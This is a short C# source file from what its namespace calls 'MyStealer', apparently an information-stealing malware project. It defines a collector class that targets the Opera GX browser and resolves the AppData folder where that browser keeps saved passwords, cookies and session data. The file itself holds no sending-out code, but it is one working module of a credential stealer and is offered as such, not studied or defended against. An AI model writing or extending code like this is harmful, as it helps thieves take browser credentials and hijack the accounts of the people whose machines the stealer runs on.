using System.IO;
using System;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    internal class OperaGX : Chromium
    {
        public override string ApplicationName => "Opera GX";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera GX Stable");
    }
}
